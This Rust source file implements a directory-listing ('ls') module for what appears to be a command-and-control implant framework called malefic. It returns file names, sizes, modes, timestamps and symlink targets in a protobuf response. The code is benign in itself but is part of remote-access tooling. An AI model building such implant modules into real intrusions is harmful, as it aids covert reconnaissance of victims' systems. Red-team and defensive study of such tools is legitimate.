use crate::{Module, TaskResult, check_field, check_request, Result};
use malefic_helper::protobuf::implantpb::{LsResponse, FileInfo};
use malefic_helper::protobuf::implantpb::spite::Body;

#[cfg(target_os = "windows")]
use std::os::windows::fs;
#[cfg(target_family = "unix")]
use std::os::unix::fs;

use async_trait::async_trait;
use malefic_trait::module_impl;
pub struct Ls {}

pub fn get_file_mode(meta: &dyn fs::MetadataExt) -> u32 {
    #[cfg(target_os = "windows")]
    {
        return meta.file_attributes();
    }
    #[cfg(target_family = "unix")]
    {
        return meta.mode();
    }
    return 0;
}

#[async_trait]
#[module_impl("ls")]
impl Module for Ls {

    #[allow(unused_variables)]
    async fn run(&mut self, id: u32, receiver: &mut crate::Input, sender: &mut crate::Output) -> Result {
        let request = check_request!(receiver, Body::Request)?;
        let path = check_field!(request.input)?;
        let mut entries = vec![];
        let read_dir = std::fs::read_dir(&path)?;
        let abs_path = std::fs::canonicalize(&path)?;

        for entry in read_dir {
            let entry = entry?;
            let p = entry.path();
            let metadata = entry.metadata()?;
            let mode = get_file_mode(&metadata);
            let link = if metadata.file_type().is_symlink() {
                std::fs::read_link(&p)
                    .map(|path| path.to_string_lossy().into_owned())
                    .unwrap_or_else(|_| String::new())
            } else {
                String::new()
            };
            entries.push(FileInfo {
                name: p.file_name().unwrap().to_str().unwrap().to_string(),
                is_dir: metadata.is_dir(),
                size: metadata.len(),
                mode: mode,
                mod_time: metadata.modified()?.duration_since(std::time::UNIX_EPOCH)
                    .unwrap_or(std::time::Duration::from_secs(0))
                    .as_secs() as i64, 
                link: link, 
            });
        }


        Ok(TaskResult::new_with_body(id, Body::LsResponse(LsResponse {
            path: abs_path.to_string_lossy().into_owned(), 
            exists: true,
            files: entries,
        })))
    }
}